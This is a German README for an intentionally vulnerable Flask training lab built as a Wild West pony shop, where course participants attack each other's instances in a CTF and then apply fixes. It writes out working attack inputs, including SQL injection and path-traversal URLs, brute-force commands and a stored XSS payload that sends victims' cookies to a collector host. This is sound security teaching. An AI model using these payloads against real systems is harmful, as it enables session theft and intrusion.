# 🤠 Cowboy-Forum — Hacking mit Python (Sicherheits-Lab)

Ein **Lehr-Lab** für den Kurs *Hacking mit Python*, gestaltet als **Cowboy-Forum**
(Wilder-Westen-Saloon) mit **Ponyverkauf**, Anschlagbrett und Login. Eine Flask-Web-App
entwickelt sich über nummerierte Ordner **schrittweise weiter**. Jeder Ordner ist
eigenständig lauffähig, baut auf dem vorherigen auf und fügt ein Thema hinzu
(Feature, Schwachstelle **oder** Fix).

Die **Seiten selbst lesen sich wie ein echter Shop** — kein Aufgaben-Text im UI. Die
Schwachstellen sind natürlich in die Features eingebaut (z. B. SQL-Injection in der
Pony-Suche, Stored-XSS in Pony-Beschreibungen). Erklärungen stehen nur in diesen
READMEs und in Code-Kommentaren.

> ⚠️ **Absichtlich verwundbar. Nur fürs Kurs-Netz.**
> Die Ordner mit „Angriff" enthalten bewusste Lücken. Betreibe die App **nur** in einem
> **vertrauenswürdigen Lab-/Kurs-Netz** (gemeinsames LAN/WLAN/VPN) — **niemals** am
> offenen Internet. Alle Angriffe richten sich ausschließlich gegen die eigene bzw. die
> Kurs-Instanz.

## Gruppen-Setup (die anderen sollen die Lücken nutzen können)
Die App bindet standardmäßig an `0.0.0.0`, ist also im lokalen Netz erreichbar:
```powershell
cd 05_sql_injection
python -m venv .venv; .venv\Scripts\activate
pip install -r requirements.txt
python seed.py        # (wo vorhanden) Testdaten
python app.py         # -> http://<deine-LAN-IP>:5000
```
- Eigene IP herausfinden: `ipconfig` (IPv4-Adresse).
- Mitspieler öffnen `http://<deine-LAN-IP>:5000` im Browser.
- Host/Port umstellen: `set HOST=127.0.0.1` bzw. `set PORT=8000` vor `python app.py`.
- **Firewall:** Windows fragt beim ersten Start, ob Python im Netz kommunizieren darf —
  im Kurs-Netz erlauben, danach wieder sperren.

## Skripte gegen Mitspieler richten (CTF im Kurs)
Jede/r betreibt die eigene verwundbare Instanz; ihr greift euch **gegenseitig** an.
Alle Angriffs-Skripte nehmen das Ziel als Parameter (oder `TARGET_URL`-Umgebungsvariable),
Standard ist `http://127.0.0.1:5000`:

```powershell
# IP des Ziels: die Person nennt dir ihre IPv4 (ipconfig). Beispiel: 192.168.1.42

# Brute Force gegen fremde Instanz
python 08_brute_force/attack_playwright.py --base http://192.168.1.42:5000 --user admin --wordlist rockyou_small.txt

# Timing-Attack gegen fremde Instanz
python 16_timing_attack/attack_timing.py --base http://192.168.1.42:5000

# SQL-Injection / LFI / IDOR: einfach die Ziel-IP in die URL setzen
#   http://192.168.1.42:5000/ponys?q=%' OR '1'='1
#   http://192.168.1.42:5000/disclaimer?page=../app.py
#   http://192.168.1.42:5000/note/2

# XSS-Cookie-Klau: Collector auf DEINEM Rechner starten (0.0.0.0), im Payload DEINE IP:
python 10_xss/collector.py         # sammelt in loot.log
#   Payload im Ponytext/Board des Opfers:
#   <script>new Image().src="http://<DEINE-IP>:5001/steal?c="+encodeURIComponent(document.cookie)</script>

# CSRF: in 12_csrf/csrf_attack.html das TARGET auf die Opfer-Instanz setzen und die Seite teilen.
```

> Fair-Play-Regel: nur Instanzen angreifen, deren Betreiber:innen mitspielen, und nur im
> Kurs-Netz. Das ist ein Übungs-CTF unter Einverständnis — keine fremden Systeme.

## Aufbau — jede Zeile der Aufgabe = ein Ordner

| # | Ordner | Thema | Typ |
|---|--------|-------|-----|
| 01 | `01_flask_webpage` | Flask: Login/Register, Sessions, WTForms-Validierung | Feature |
| 02 | `02_sql_datenbank` | Externe SQL-Anbindung (SQLAlchemy) | Feature |
| 03 | `03_user_content_board` | Anschlagbrett mit Content aller User | Feature |
| 04 | `04_zwei_faktor_auth` | 2FA (TOTP) bei der Registrierung | Feature |
| 05 | `05_sql_injection` | SQL-Injection + Burp-Handhabung | ⚠️ Angriff |
| 06 | `06_passwort_hashes` | Hashes offline knacken (Hashcat/John/OphCrack) | ⚠️ Angriff |
| 07 | `07_fix_sql_injection` | Fix SQLi (`text()` mit `:`), bandit/detect-secrets | ✅ Fix |
| 08 | `08_brute_force` | Brute Force (Playwright/Hydra/Burp) | ⚠️ Angriff |
| 09 | `09_fix_brute_force` | Fix: Rate-Limit + Account-Lockout | ✅ Fix |
| 10 | `10_xss` | Stored XSS: Cookie-Klau & Keylogger | ⚠️ Angriff |
| 11 | `11_fix_xss` | Fix: Escaping + CSP + HttpOnly | ✅ Fix |
| 12 | `12_csrf` | CSRF-Szenario + Fix (`form.hidden_tag()`) | ⚠️+✅ |
| 13 | `13_session_forgery` | Session-Forgery mit `flask-unsign` + Fix | ⚠️+✅ |
| 14 | `14_lfi` | Local File Inclusion (Secret-Leak) + Fix | ⚠️+✅ |
| 15 | `15_idor` | IDOR (ID in URL) + Fix (Owner-Check) | ⚠️+✅ |
| 16 | `16_timing_attack` | Timing-Seitenkanal + Fix (`hmac.compare_digest`) | ⚠️+✅ |
| 99 | `99_secret_scanner` | **Defensiv:** eigenen Git-Verlauf nach Secrets scannen | 🛡️ Tool |

## Zwei Dinge bewusst anders gelöst
- **Kein Plündern fremder GitHub-Repos.** Die Aufgaben-Zeile „echte Passwörter/Secret-Keys
  aus GitHub ziehen und brute-forcen" zielt auf fremde Systeme und ist **nicht** enthalten.
  Ordner 99 bringt stattdessen die defensive Variante (eigene Leaks finden) — gleiche Lehre.
- **Netz-Zugriff mit Warnbanner.** Jede Seite zeigt oben den Hinweis „nur im Kurs-Netz".

## Didaktisches Prinzip
Für jede Schwachstelle: erst das **Szenario** (Angriff), dann der **Fix**. Der
Erkenntnisgewinn liegt im direkten Kontrast — oft sichtbar im selben Ordner
(`/route` verwundbar vs. `/route-safe` sicher).
